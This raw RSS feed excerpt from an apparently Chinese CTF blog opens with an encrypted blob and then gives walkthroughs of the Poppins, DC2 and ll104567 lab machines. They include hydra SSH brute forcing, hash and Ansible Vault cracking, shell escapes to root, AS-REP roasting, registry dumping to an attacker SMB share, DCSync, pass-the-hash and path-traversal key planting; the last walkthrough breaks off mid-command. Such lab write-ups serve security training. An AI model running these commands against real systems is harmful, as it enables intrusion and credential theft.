DF1VMS1BdWx4WSw8RBR5PXXh6E0sQV18cBkgcGFQWOxcMHR0cXXh1VghUTxNUSAZTXFFFUlB/DxEFHk9deHoTSxBXDkxLW1wYVl07FwwdHRxdeHVWCFRPE18JTxhOUVpSHhAZE0cHV19nVRNSHhgANxhdSk5eEVRaDh8GDVFfFl0BXhtnEgkGTU9ddz9QDwhKFkRZHBhUE0VVQhUcCBdUV1AtUxQOGx0bZ0tdRQRYFghfCwRWXlFQXFsGAh5iEDIYGBEDRBoZSxsETUpbUi1dGgovGApMUB5GB14BVkpITUlNV0NJHgEAAEcbWUtLQBYXBBgfHFAUMhgXVEAAAgRTCVlbU0ICbhEIAxxNSU1XQ0kLVUsBHQRMAxdfHVwQQhIJBk1PXRgTHlMcBQcfAxQyF1IXBBgfHFBKTVZoE0IqGAMNGR5JTVgGCk9NVhkeV0wDRR1eAUsBHQRMAzJKeFMUAAUfDnh1WU0XCwtCEUxLVFYYGgFXVUIVHAgXSFlEAUYRTQAJGEtPXBlAAUdYQFFbDAgAB0MFTEMSCQAyBBdUHVUQU0xHG0pdBj1OQUvlvL7mnb3li4novrvoobTml47vvLTkvK3lsbTmgYfmhbrnm6kACRhLT1zmlrDkuoTlhrTlr4zlh7TlhJXliZhXW1dcUkweEBkTRxtZS0tAFg1aDh8MDgbvvLTku7bogLvlianlu4vlkbvploXnlZjmiZ/jgakEF0gJeA0dXlABDwUfDBrlibXmjZPliYUfHwcf5p276ZmoHwlGH1XliarmjJLliZgZV1dM5p206ZiiDVoFQ1ZhBEgG55uD5o+X55mK5bygD+WxgeWkleS7re+8tOWvvueguQsRXhEITgkJW1xdURUNWg4fDA4GBBdHTDtJHQINVQRbV1MXERYBERsYBR9UVhxWAAwXDUZLUF1bHhZVAREGDAUfS18XXRlKTgoKVU1PUjJ8FBcVUhUXWRwXAURVD3o4CktLT1gAVU9NehoEV0x4ehNLEFdfAARVXRdVE1wAGhVHChsYUVN4RBwJTVhDSldXQ1sREgQUVVsQSldYBhhVCgIHHkhLBQdaQxoCBEFhBBdbWBZUS1FfGBldBjILGgBVBBRVTOWFleiOj+WPrlEeUBJKTuWEheOBquiOj+WPrn5bE1ZJQhhZVTIESEUXD0kOHwwOGFtUVgFCSEocCQVfTVlQFxwGBRUEBx8YVFYcVkhKAwAOVFQfCQBeGhkwJQpCXQIYGl4YCF8KClVNT1JdUFZNEwkfGBdKWB1FWh8fBx8WTEBDUh4GHwZHH15MSBgHQhAfXhwTTDJeWxNWDh8fBx8VDgkOR1MRVRFRDw8NDVZGABBZSVtfDAhZD0IFE1lGDF9FMl5bE1YOGAMNGRUMXQBLUBNUFFEJDAsMAUYDR1URDVoJCAgPQQgUX0VfXkUyTUQXQxsMHQ1RWllVQgVUfwMVDQ8CWkpCBlQTAgILDjIEF1QdVRBTTEcbSl0GPU5BS0seChhIAwQYAg9/UV8KBFxBBj1OHh0ZHQRV--&gt;
&lt;!--/encrypt--&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/%F0%9F%94%92-nei-bu-_Maze.html</guid><pubDate>Thu, 04 Sep 2025 12:24:03 +0000</pubDate></item><item><title>内部_Poppins</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Poppins.html</link><description># 一、信息收集 

使用 arp-scan 扫描局域网中的主机：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.143 08:00:27:77:42:bb       PCS Systemtechnik GmbH
...
```

发现目标主机：`192.168.205.143`

## 端口扫描

对目标主机进行全端口扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 15:20 EDT
Nmap scan report for 192.168.205.143
Host is up (0.000089s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
995/tcp open  pop3s
```

发现四个开放端口：

- **22/tcp**: SSH服务
- **80/tcp**: HTTP服务
- **110/tcp**: POP3服务
- **995/tcp**: POP3S服务

# 二、Web服务探测

访问80端口发现是一个电影介绍页面，包含一些人名信息。

## 目录枚举

使用 dirsearch 进行目录扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -u 192.168.205.143        
...
[15:23:04] 301 -  314B  - /s  -&gt;  http://192.168.205.143/s/
...
```

发现 `/s` 目录，继续深入探测。

## 深度目录爆破的思路

这里有个关键的思路转换：当发现只有一个 `/s` 目录时，我想到这可能不是普通的目录结构。结合这是Sublarge出的靶机，我记得之前做过类似的题目，有些靶机会把SSH私钥或重要文件藏在很深的目录路径中。

既然只发现了字母 `s`，那很可能是按字母逐层构建的深层目录。于是我决定用单字母作为字典进行递归爆破：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ printf '%s\n' {a..z} &gt; a.txt                                       
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ printf '%s\n' {A..Z} &gt;&gt; a.txt
```

创建包含所有大小写字母的字典文件，然后使用 feroxbuster 进行深度递归扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ feroxbuster --url http://192.168.205.143 -w a.txt -t 64 --depth 99999
...
301      GET        9l       28w      314c http://192.168.205.143/s =&gt; http://192.168.205.143/s/
301      GET        9l       28w      316c http://192.168.205.143/s/u =&gt; http://192.168.205.143/s/u/
301      GET        9l       28w      318c http://192.168.205.143/s/u/p =&gt; http://192.168.205.143/s/u/p/
...
301      GET        9l       28w      380c http://192.168.205.143/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/ =&gt; 
...
```

**关键洞察**：这里设置 `--depth 99999` 是为了让工具无限递归，直到找不到更多目录为止。随着扫描的进行，可以看到路径越来越长，最终揭示了完整的单词：

`s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s`

这个路径实际上是单词 **'supercalifragilisticexpialidocious'** 的字母分解，这是电影《欢乐满人间》(Mary Poppins)中的经典单词，与靶机名称'Poppins'呼应。

在该超长目录下继续扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ gobuster dir -u http://192.168.205.143/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64 
...
/index.html           (Status: 200) [Size: 1531]
/hash.bak             (Status: 200) [Size: 3300]
```

果然发现了关键文件 `hash.bak`。

# 三、哈希破解

下载并分析 hash.bak 文件：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.143/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/hash.bak
fcb6cc0d2a780ac022cf70ceb0d85f4c
c63c3575b62f4944fba4879c2dd3951b
...
```

文件包含100个MD5哈希值。使用john进行破解：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5     
...
kent12           (?)   
amotejoel        (?)   
sunjoo           (?)   
...
```

提取破解成功的密码：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ john --show hash --format=Raw-MD5 | cut -d: -f2 | sort | uniq &gt; pass
```

# 四、用户名收集与SSH爆破

## 用户名枚举

使用 cewl 从主页提取可能的用户名：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cewl http://192.168.205.143/ | tr 'A-Z' 'a-z' &gt; user
```

通过SSH连接测试，发现系统的行为特点：

- 存在的用户会提示输入密码
- 不存在的用户直接返回 'Permission denied (publickey)'

利用此特点枚举有效用户：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ while read u; do timeout 3 ssh '$u@192.168.205.143' 2&gt;&amp;1 | grep -q 'publickey' || echo '$u'; done &lt; user
jane
bert
```

发现三个有效用户：jane、bert、root

## SSH密码爆破

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ echo -e 'jane\nbert\nroot' &gt; user                                                       
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ hydra -L user -P pass ssh://192.168.205.143 -I -u -e nsr -t 64
...
[22][ssh] host: 192.168.205.143   login: bert   password: jmac92777
```

成功获得bert用户的凭据：`bert:jmac92777`

# 五、初始访问与邮件分析

尝试SSH登录bert用户：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ssh bert@192.168.205.143          
bert@192.168.205.143's password: 
...
You have mail.
This account is currently not available.
Connection to 192.168.205.143 closed.
```

虽然SSH会话被立即关闭，但提示显示有邮件。使用POP3协议查看邮件：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nc 192.168.205.143 110
+OK Dovecot (Debian) ready.
User bert
+OK
Pass jmac92777
+OK Logged in.
STAT
+OK 1 1517
retr 1
+OK 1517 octets
```

邮件内容显示Jane发送给Bert的重要信息：

```
Subject: Urgent: Prod Server Credentials for Ansible Playbook
From: jane@poppins
To: bert@poppins

Hi Bert,

I've just finished the new Ansible playbook for the a-27 software deployment on our main production server, `web01.poppins.dsz`. It's ready to go.

The playbook contains some sensitive API keys, so I've encrypted the variables using Ansible Vault. You'll need to use the `ansible-vault decrypt` command to run it.

Here is the vault string you'll need to paste into the `secrets.yml` file.

$ANSIBLE_VAULT;1.1;AES256
66626631636362303332633238373338386634373434646532656534323230333938303331663630
3236333934663930343263363831353138323630393134320a366366393939373636386538336336
34353536656637313762323832643339633234656635326137633439303730373335386536306436
6335363366376634630a326563623737626337353436323565643365333061663661396337613731
3730
```

# 六、Ansible Vault破解

## 提取并破解Vault密码

将Vault内容保存到文件并使用john破解：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ansible2john secrets.yml &gt; hash                                                
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                             
...
javiel           (secrets.yml)   
```

使用破解的密码解密Vault：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ansible-vault view secrets.yml                                                 
Vault password: javiel
cumibug
```

获得两个关键信息：

- Vault密码：`javiel`
- 解密后的密码：`cumibug`

# 七、权限提升

## 获得Jane用户权限

尝试使用解密的Vault密码作为Jane的密码：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ssh jane@192.168.205.143
jane@192.168.205.143's password: javiel
...
jane@Poppins:~$ id
uid=1001(jane) gid=1001(jane) groups=1001(jane)
```

## 切换到Michael用户

使用Vault中的密码切换到michael用户：

```bash
jane@Poppins:/home$ su michael
Password: cumibug
michael@Poppins:/home$ sudo -l
...
User michael may run the following commands on Poppins:
    (winifred) PASSWD: /usr/bin/mail *
```

Michael可以以winifred用户身份运行mail命令。

## 利用mail命令提升到Winifred

参考GTFObins，mail命令可以通过交互式shell逃逸，但是因为它这个mail命令版本太低（应该是吧）的原因，无法直接使用`--exec`参数，我们只可以给自己发送一个邮件，进到mail交互通过交互式shell逃逸：

```bash
michael@Poppins:/home$ sudo -u winifred /usr/bin/mail -s 'test' winifred &lt; /dev/null
Null message body; hope that's ok
michael@Poppins:/home$ sudo -u winifred /usr/bin/mail
Mail version 8.1.2 01/15/2001.  Type ? for help.
'/var/mail/winifred': 1 message 1 new
&gt;N  1 winifred@poppins   Tue Sep 02 09:41   18/558   test
&amp; !/bin/bash
```

成功获得winifred用户权限：

```bash
winifred@Poppins:/home$ sudo -l
...
User winifred may run the following commands on Poppins:
    (ALL) NOPASSWD: /usr/bin/ansible *
```

## 利用Ansible获得Root权限

Winifred可以无密码运行ansible命令。Ansible的shell模块可以执行任意命令：

```bash
winifred@Poppins:/home$ sudo /usr/bin/ansible localhost -m shell -a 'id' 
[WARNING]: No inventory was parsed, only implicit localhost is available
localhost | CHANGED | rc=0 &gt;&gt;
uid=0(root) gid=0(root) groups=0(root)
```

为bash设置SUID位以获得持久的root权限：

```bash
winifred@Poppins:/home$ sudo /usr/bin/ansible localhost -m shell -a 'chmod +s /bin/bash' 
...
winifred@Poppins:/home$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
winifred@Poppins:/home$ bash -p
bash-5.0# id
uid=1003(winifred) gid=1003(winifred) euid=0(root) egid=0(root) groups=0(root),1003(winifred)
```

# 八、获取flag

```bash
bash-5.0# cat /root/root.txt /var/mail/user.txt 
flag{root-bdabe071bed8018ba8e15d795d281843}
flag{user-b1d2367529a9edd2a6f9c95168bce12ei}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Poppins.html</guid><pubDate>Thu, 04 Sep 2025 06:25:43 +0000</pubDate></item><item><title>hmv_DC2</title><link>https://7r1UMPHK.github.io/post/hmv_DC2.html</link><description># 一、信息收集

## 主机发现

使用arp-scan扫描本地网段，发现目标主机：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.146 08:00:27:ae:b5:53       PCS Systemtechnik GmbH
...
```

确定目标IP：`192.168.205.146`

## 端口扫描

使用rustscan对目标进行全端口扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ rustscan -a 192.168.205.146
...
Open 192.168.205.146:53
Open 192.168.205.146:88
Open 192.168.205.146:135
Open 192.168.205.146:139
Open 192.168.205.146:389
Open 192.168.205.146:445
Open 192.168.205.146:464
Open 192.168.205.146:593
Open 192.168.205.146:636
Open 192.168.205.146:3268
Open 192.168.205.146:3269
Open 192.168.205.146:5985
Open 192.168.205.146:9389
```

从开放端口可以判断这是一台Windows域控制器，关键服务包括：

- 53: DNS服务
- 88: Kerberos认证服务
- 389/636: LDAP/LDAPS
- 445: SMB服务
- 5985: WinRM服务

## SMB信息收集

使用enum4linux-ng进行SMB枚举：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ enum4linux-ng -A 192.168.205.146
...
[+] Long domain name is: SOUPEDECODE.LOCAL
[+] Got domain/workgroup name: SOUPEDECODE
[+] Full NetBIOS names information:
- DC01            &lt;00&gt; -         M &lt;ACTIVE&gt;  Workstation Service
- SOUPEDECODE     &lt;1c&gt; - &lt;GROUP&gt; M &lt;ACTIVE&gt;  Domain Controllers
...
```

获取重要信息：

- 域名：`SOUPEDECODE.LOCAL`
- 域控制器主机名：`DC01`
- FQDN：`DC01.SOUPEDECODE.LOCAL`
- 无匿名登录

将域名添加到hosts文件：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo '192.168.205.146 SOUPEDECODE.LOCAL' &gt;&gt; /etc/hosts
```

## 漏洞扫描

使用nmap漏洞扫描脚本检测SMB相关漏洞：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap --script=vuln -p445,139 192.168.205.146 
...
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
...
```

未发现可利用的SMB漏洞。

## LDAP信息收集

尝试匿名绑定LDAP服务：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ldapsearch -H ldap://192.168.205.146 -x -b 'dc=soupedecode,dc=local'
...
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this operation a successful bind must be completed on the connection.
...
```

LDAP服务拒绝匿名查询，需要有效凭据。

# 二、用户枚举

使用kerbrute工具枚举域用户：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ kerbrute userenum --dc 192.168.205.146 -d soupedecode.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 64
...
2025/09/03 13:39:39 &gt;  [+] VALID USERNAME:       admin@soupedecode.local
2025/09/03 13:39:39 &gt;  [+] VALID USERNAME:       charlie@soupedecode.local
2025/09/03 13:39:39 &gt;  [+] VALID USERNAME:       administrator@soupedecode.local
...
```

发现有效用户名：

- admin
- charlie
- administrator

# 三、密码爆破

## SMB密码爆破

使用crackmapexec对发现的用户进行密码喷洒攻击：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ crackmapexec smb 192.168.205.146 -u user -p user --continue-on-success| grep '+'
SMB                      192.168.205.146 445    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie 
```

成功获得一组有效凭据：`charlie:charlie`

## 验证权限

使用获得的凭据查看SMB共享权限：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nxc smb 192.168.205.146 -u charlie -p charlie --shares
...
SMB         192.168.205.146 445    DC01             Share           Permissions     Remark
SMB         192.168.205.146 445    DC01             -----           -----------     ------
SMB         192.168.205.146 445    DC01             ADMIN$                          Remote Admin
SMB         192.168.205.146 445    DC01             C$                              Default share
SMB         192.168.205.146 445    DC01             IPC$            READ            Remote IPC
SMB         192.168.205.146 445    DC01             NETLOGON        READ            Logon server share 
SMB         192.168.205.146 445    DC01             SYSVOL          READ            Logon server share
```

charlie用户只有标准的域用户权限，无法访问敏感共享。

# 四、域用户进一步枚举

## RID爆破

使用charlie用户的凭据进行RID爆破，获取更多用户信息：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nxc smb 192.168.205.146 -u charlie -p charlie --rid-brute|awk -F '\' '{print $2}'|awk '{print $1}' &gt; user
```

## Kerberoasting攻击

使用GetNPUsers工具检查是否有用户设置了'不要求Kerberos预认证'属性：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ impacket-GetNPUsers -usersfile user -dc-ip 192.168.205.146 'SOUPEDECODE.LOCAL/charlie:charlie' |grep -v '-'

$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:658c87a58d98ac6611635ed17f2dde44$dca073223197802e16eda82933c8edf55b906146cf6eb9ba9e5ff4c3dff4a74d70a91b8787a8a12dd5a85196534f86252203f806f02793903578d5d42c2f4df593c749f6a47f81011356b05caee386f1610848d1a1e92fa79504b988bed455e8e973f720203ac48e13398cd103a0e719bacf3e880591e0aab24a4f191832bb948fe7f5fcd3b17e16302998e592387ae5a25c6c8b8a5566f2b2aa7cd6e26e392c06e7877069df8736662a357aba9edf69cc5b294af97a3af3df6350db9ba829a98ef293de9f10242642e8dab8c55e8024d26c98b7ae9c12a9ff9a0c4afc52f97e765569d0ab540c80505536cade0fce31973c6854507d
```

发现用户`zximena448`存在AS-REP Roasting漏洞，获得Kerberos票据哈希。

## 哈希破解

使用john工具破解AS-REP哈希：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
...
internet         ($krb5asrep$23$zximena448@SOUPEDECODE.LOCAL)   
...
```

成功破解密码：`zximena448:internet`

# 五、权限提升

## 验证新凭据

使用新获得的凭据测试权限：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nxc smb 192.168.205.146 -u zximena448 -p internet --shares   
...
SMB         192.168.205.146 445    DC01             Share           Permissions     Remark
SMB         192.168.205.146 445    DC01             -----           -----------     ------
SMB         192.168.205.146 445    DC01             ADMIN$          READ            Remote Admin
SMB         192.168.205.146 445    DC01             C$              READ,WRITE      Default share
...
```

zximena448用户具有更高权限，可以访问ADMIN$和C$共享。

## LDAP详细枚举

使用ldapdomaindump工具进行详细的LDAP信息收集：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 /usr/lib/python3/dist-packages/ldapdomaindump -u 'SOUPEDECODE.LOCAL\zximena448' -p 'internet' 192.168.205.146
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

通过查看生成的HTML报告，发现zximena448用户是**Backup Operators**组的成员。

## Backup Operators权限利用

Backup Operators是Windows的内置组，该组成员具有SeBackupPrivilege特权，可以读取域控制器上的敏感文件，包括SAM数据库。

### 设置SMB服务器

在攻击机上启动SMB服务器接收备份文件：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ impacket-smbserver share . -smb2support
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
...
```

### 备份注册表

利用SeBackupPrivilege特权备份SAM、SYSTEM和SECURITY注册表：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ impacket-reg 'zximena448:internet@192.168.205.146' backup -o '\\192.168.205.128\share'
[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to \\192.168.205.128\share\SAM.save
[*] Saved HKLM\SYSTEM to \\192.168.205.128\share\SYSTEM.save
[*] Saved HKLM\SECURITY to \\192.168.205.128\share\SECURITY.save
```

### 提取本地哈希

使用secretsdump工具从备份的注册表文件中提取密码哈希：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
...
[*] $MACHINE.ACC 
...
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:aa905227fd1b4142a01a09912606af5c
...
```

获得机器账户`DC01$`的NTLM哈希：`aa905227fd1b4142a01a09912606af5c`

## DCSync攻击

### 验证机器账户权限

使用机器账户哈希验证权限：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nxc smb 192.168.205.146 -u 'DC01$' -H 'aa905227fd1b4142a01a09912606af5c' --ntds
[+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.205.146 445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::
SMB         192.168.205.146 445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.205.146 445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::
SMB         192.168.205.146 445    DC01             soupedecode.local\bmark0:1103:aad3b435b51404eeaad3b435b51404ee:d72c66e955a6dc0fe5e76d205a630b15:::
```

成功执行DCSync攻击，获得域内所有用户的密码哈希，包括域管理员Administrator的NTLM哈希：`8982babd4da89d33210779a6c5b078bd`

# 六、获取域管权限

使用域管理员的NTLM哈希进行Pass-the-Hash攻击：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ evil-winrm -i 192.168.205.146 -u Administrator -H '8982babd4da89d33210779a6c5b078bd'       
                                      
Evil-WinRM shell v3.7
...
*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
soupedecode\administrator
```

成功获得域管理员权限。

## 获取flag

```bash
*Evil-WinRM* PS C:\Users&gt; type C:\Users\Administrator\Desktop\root.txt
d41d8cd98f00b204e9800998ecf8427e

*Evil-WinRM* PS C:\Users&gt; type C:\Users\zximena448\Desktop\user.txt
2fe79eb0e02ecd4dd2833cfcbbdb504c
```

# 七、攻击总结

本次渗透测试的攻击路径如下：

1. **信息收集**：通过端口扫描和服务枚举，识别目标为Windows域控制器
2. **用户枚举**：使用kerbrute工具枚举有效域用户
3. **凭据获取**：通过密码喷洒攻击获得charlie用户凭据
4. **AS-REP Roasting**：发现zximena448用户存在Kerberos预认证漏洞，破解获得密码
5. **权限提升**：利用zximena448用户的Backup Operators权限备份注册表
6. **横向移动**：提取机器账户哈希，执行DCSync攻击
7. **域管接管**：使用域管理员哈希获得完全控制权限

**关键知识点**：

- **Backup Operators组**：该组成员具有SeBackupPrivilege特权，可以备份和还原文件，包括敏感的系统文件
- **AS-REP Roasting**：针对设置了'不要求Kerberos预认证'属性的用户账户的攻击技术
- **DCSync攻击**：利用域控制器权限同步整个域数据库的高级攻击技术
- **Pass-the-Hash**：无需明文密码，直接使用NTLM哈希进行身份验证的技术sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_DC2.html</guid><pubDate>Thu, 04 Sep 2025 06:25:16 +0000</pubDate></item><item><title>内部_ll104567</title><link>https://7r1UMPHK.github.io/post/nei-bu-_ll104567.html</link><description># 一、信息收集

## 1.1 主机发现与端口扫描

首先，在VMware NAT网络环境下，使用`arp-scan`进行主机发现，确定目标靶机的IP地址。

```bash
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
192.168.205.156 08:00:27:f9:af:5d       PCS Systemtechnik GmbH
...
```

发现目标主机IP为 `192.168.205.156`。

接着，使用`nmap`对目标主机进行全端口扫描，以识别所有开放的服务。

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p0-65535 192.168.205.156
...
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1045/tcp  open  fpitp
MAC Address: 08:00:27:F9:AF:5D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

扫描结果显示，目标开放了多个端口，包括SSH(22)、HTTP(80)、SMB(139, 445)服务，以及一个非常规的`1045`端口。

## 1.2 服务版本探测

对非标准端口`1045`进行详细的服务版本探测和脚本扫描，以了解其运行的应用。

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p1045 -sC -sV 192.168.205.156
...
PORT     STATE SERVICE VERSION
1045/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.9.2)
|_http-server-header: Werkzeug/3.1.3 Python/3.9.2
|_http-title: 404 Not Found
```

`1045`端口上运行的是一个基于`Python Werkzeug`的HTTP服务。直接访问时返回404，这表明我们需要寻找正确的API路径或Web端点。

## 1.3 SMB信息枚举

由于目标开放了SMB服务，使用`enum4linux-ng`进行详细枚举，寻找可利用的信息，如共享目录和匿名访问权限。

```bash
┌──(kali㉿kali)-[~]
└─$ enum4linux-ng -A 192.168.205.156
...
 =========================================
|    Shares via RPC on 192.168.205.156    |
 =========================================
[*] Enumerating shares
[+] Found 3 share(s):
...
user_files:
  comment: User Files Share
  type: Disk
...
[*] Testing share user_files
[+] Mapping: OK, Listing: OK
```

枚举发现了一个名为 `user_files` 的共享目录，并且允许匿名访问和列出文件。尝试连接后发现目录为空，暂时没有发现可利用的文件。

# 二、Web服务渗透与漏洞利用

## 2.1 Web信息探索

访问`80`端口的HTTP服务，发现是一个“名字Gay指数计算器”的Web应用。查看网页源代码，发现一个注释提示，这可能是后续认证的关键凭证。

```html
&lt;!-- xixilake-session-secure-2025 --&gt;
```

这个注释 `xixilake-session-secure-2025` 看起来像一个密钥或Session令牌，我们将其记录下来以备后用。

## 2.2 API接口探索与突破

转向`1045`端口的Web服务，对其进行目录爆破发现了`/api`路径，并进一步在`/api`下找到了`/api/health`端点。访问该端点获取了API的结构信息，其中最关键的是指明了用于文件操作的路径：`/api/files/`。

```bash
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.205.156:1045/api/health
{'available_endpoints':{'/api':'API information','/api/files/':'File operations',...}}
```

结合之前发现的令牌，我们推断它可能用作`X-Session-Token`头进行身份认证。首先，在本地创建一个包含SSH公钥的文件`authorized_keys`，然后尝试利用此令牌上传该文件。

```bash
┌──(kali㉿kali)-[~]
└─$ curl -X PUT -H 'X-Session-Token: xixilake-session-secure-2025' -T authorized_keys http://192.168.205.156:1045/api/files/authorized_keys
{'message':'File authorized_keys uploaded successfully'}
```

上传成功！这确认了我们拥有通过API向服务器特定目录写入文件的能力。

## 2.3 路径遍历漏洞的发现与利用

既然可以操作文件，下一步就是测试是否存在路径遍历（Path Traversal）漏洞。我们尝试通过构造 `../` 序列来读取位于Web目录之外的 `/etc/passwd` 文件。

```bash
┌──(kali㉿kali)-[~]
└─$ curl --path-as-is 'http://192.168.205.156:1045/api/files/../../../etc/passwd' -H 'X-Session-Token: xixilake-session-secure-2025'
root:x:0:0:root:/root:/bin/bash
...
ll:x:1001:1001::/home/ll:/bin/bash
```

成功读取！这证明了漏洞的存在，并且我们可以通过此漏洞获取一个名为`ll`的用户信息。

### **技术剖析：客户端路径规范化与`--path-as-is`的重要性**

在这里，`--path-as-is`标志是本次漏洞利用成功的**决定性因素**。若缺少此标志，无论是使用浏览器还是默认的`curl`命令，攻击都会失败。其根本原因在于**客户端路径规范化 (Client-Side Path Normalization)**。

1.  **为什么浏览器和默认`curl`会失败？**
    当你在浏览器地址栏或标准的`curl`命令中输入包含 `../` 的URL时，客户端应用（浏览器或curl程序）会在发送HTTP请求**之前**，就“智能地”对路径进行清理和规范化。
    *   **输入路径**: `/api/files/../../../etc/passwd`
    *   **客户端规范化后**: `/etc/passwd`
        最终发送到服务器的请求路径是 `/etc/passwd`，这个路径不符合应用的API路由规则，因此无法触发漏洞，导致404错误。

2.  **为什么`--path-as-is`能够成功？**
    此参数的作用是告诉`curl`**关闭其默认的路径规范化功能**。它会将URL中的路径部分 `../../../etc/passwd` 原封不动地发送给服务器。由于服务端的Python应用代码存在缺陷，没有对接收到的路径进行安全处理，因此直接拼接并执行了文件操作，最终导致了目录遍历漏洞的成功利用。

利用此漏洞，我们使用`MOVE`方法将之前上传的`authorized_keys`文件移动到目标用户`ll`的`.ssh`目录下。

```bash
┌──(kali㉿kali)-[~]
